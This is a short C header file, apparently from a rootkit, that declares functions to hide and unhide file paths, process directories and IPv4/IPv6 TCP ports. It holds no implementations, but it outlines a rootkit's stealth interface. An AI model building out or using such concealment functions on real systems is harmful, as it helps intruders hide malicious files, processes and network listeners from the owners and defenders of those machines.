#ifndef ROOTKIT_HIDER_H
#define ROOTKIT_HIDER_H


void hide_absolute_path(const char *path);
void unhide_absolute_path(const char *path);

void hide_process_dir(int pid);
void unhide_process_dir(int pid);

void hide_tcp4_port(int port);
void unhide_tcp4_port(int port);

void hide_tcp6_port(int port);
void unhide_tcp6_port(int port);

#endif //ROOTKIT_HIDER_H
